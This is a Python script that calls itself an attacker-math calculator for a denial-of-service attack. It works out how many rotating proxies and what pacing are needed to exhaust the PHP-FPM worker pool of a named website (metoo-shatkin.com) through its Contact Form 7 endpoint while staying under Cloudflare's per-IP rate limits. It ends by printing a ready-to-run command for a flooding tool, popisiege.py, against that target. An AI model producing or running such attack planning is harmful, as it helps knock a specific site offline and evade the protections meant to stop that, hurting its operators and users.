#!/usr/bin/env python3
"""
feasibility_calc.py — attacker-math calculator for CF7 worker exhaustion.

Given what we measured empirically (per-IP request budget before Cloudflare
trips a 429/403, and the cooldown duration before that IP is usable again),
this computes:

  1. The sustained request rate needed to keep the target's PHP-FPM pool
     continuously saturated.
  2. The maximum SAFE sustained rate achievable with the proxy pool on hand,
     without any single IP crossing Cloudflare's per-IP budget.
  3. Verdict: sufficient or not — and if not, how many proxies would be
     needed to close the gap.
  4. If sufficient: the exact --proxy-rotate-interval / --delay values to
     hand to popisiege.py so it runs at that safe ceiling instead of
     guessing and tripping rate limits.

Usage:
  python3 feasibility_calc.py
  python3 feasibility_calc.py --proxies 100 --budget 5 --cooldown 300 --workers 19 --hold-time 1.5
  python3 feasibility_calc.py --cooldown 600   # once you pin down the real T_c
"""

import argparse
import math


def main():
    ap = argparse.ArgumentParser(description="CF7 worker-exhaustion feasibility calculator")
    ap.add_argument("--proxies",   type=int,   default=100,  help="Distinct proxy IPs available (default: 100)")
    ap.add_argument("--budget",    type=int,   default=5,    help="Requests one IP can send before CF trips it (default: 5, measured)")
    ap.add_argument("--cooldown",  type=float, default=300,  help="Seconds an IP stays blocked before reuse is safe (default: 300, measured lower bound — actual T_c may be higher)")
    ap.add_argument("--workers",   type=int,   default=19,   help="Target's PHP-FPM worker pool size (default: 19, metoo-shatkin.com)")
    ap.add_argument("--hold-time", type=float, default=1.5,  help="Seconds a request occupies a PHP-FPM worker, approximated by round-trip time (default: 1.5)")
    ap.add_argument("--concurrency", type=int, default=None, help="Concurrent slots to use (default: min(proxies, workers))")
    args = ap.parse_args()

    N   = args.proxies
    B   = args.budget
    Tc  = args.cooldown
    W   = args.workers
    ht  = args.hold_time
    C   = args.concurrency or min(N, W)

    print("=" * 64)
    print("  CF7 WORKER-EXHAUSTION FEASIBILITY CALCULATOR")
    print("=" * 64)
    print(f"  Proxies available     : {N}")
    print(f"  Per-IP budget (B)     : {B} requests before block")
    print(f"  Cooldown (T_c)        : {Tc:.0f}s  {'(measured lower bound — could be higher)' if Tc <= 300 else ''}")
    print(f"  Target PHP-FPM workers: {W}")
    print(f"  Worker hold time      : {ht}s")
    print(f"  Concurrency used      : {C}")
    print("-" * 64)

    # 1. Rate needed to keep all W workers continuously busy
    required_rate = W / ht
    print(f"\n  Required sustained rate to saturate origin:")
    print(f"    required_rate = workers / hold_time = {W} / {ht} = {required_rate:.2f} req/s")

    # 2. Max safe sustained rate with N proxies respecting B and T_c
    max_safe_rate = (N * B) / Tc
    print(f"\n  Max safe sustained rate with {N} proxies:")
    print(f"    max_safe_rate = (proxies × budget) / cooldown = ({N} × {B}) / {Tc:.0f} = {max_safe_rate:.2f} req/s")

    # 3. Verdict
    print("-" * 64)
    if max_safe_rate >= required_rate:
        print(f"\n  VERDICT: SUFFICIENT — {N} proxies can saturate the {W}-worker pool")
        print(f"  ({max_safe_rate:.2f} req/s available ≥ {required_rate:.2f} req/s needed)\n")

        # 4. Compute optimal pacing for popisiege.py
        # τ = rotate interval such that a proxy doesn't come back into use
        # before its cooldown has elapsed: τ ≥ T_c × C / N
        tau = Tc * C / N
        # delay between bursts so a proxy fires at most B times within τ:
        # τ / (hold_time + delay) ≤ B  =>  delay ≥ τ/B - hold_time
        delay = max(0.0, tau / B - ht)
        achieved_rate = C / (ht + delay)

        print(f"  Recommended pacing:")
        print(f"    --proxy-rotate-interval {tau:.0f}   (τ = T_c × concurrency / proxies = {Tc:.0f} × {C} / {N})")
        print(f"    --delay {delay:.1f}                  (τ/budget − hold_time = {tau:.0f}/{B} − {ht})")
        print(f"    achieved rate ≈ {achieved_rate:.2f} req/s (concurrency / (hold_time + delay))")
        print(f"\n  Run:")
        print(f"    sudo python3 popisiege.py --target metoo-shatkin.com --concurrency {C} \\")
        print(f"      --proxy-file proxies_webshare_backbone_creds.txt \\")
        print(f"      --proxy-rotate-interval {tau:.0f} --delay {delay:.1f} --verbose")

    else:
        gap = required_rate / max_safe_rate
        required_proxies = math.ceil(N * gap)
        print(f"\n  VERDICT: INSUFFICIENT — {N} proxies cannot saturate the {W}-worker pool")
        print(f"  ({max_safe_rate:.2f} req/s available < {required_rate:.2f} req/s needed, "
              f"only {100/gap:.0f}% of what's required)")
        print(f"\n  Proxies needed to close the gap:")
        print(f"    required_proxies = proxies × (required_rate / max_safe_rate)")
        print(f"                     = {N} × ({required_rate:.2f} / {max_safe_rate:.2f})")
        print(f"                     ≈ {required_proxies} distinct IPs")
        print(f"\n  This is botnet-scale, not rentable-proxy-pool scale.")
        print(f"  Detection signature: sustained traffic from >{N} distinct source IPs")
        print(f"  against a single sensitive endpoint is a strong botnet indicator.\n")

    print("=" * 64)


if __name__ == "__main__":
    main()
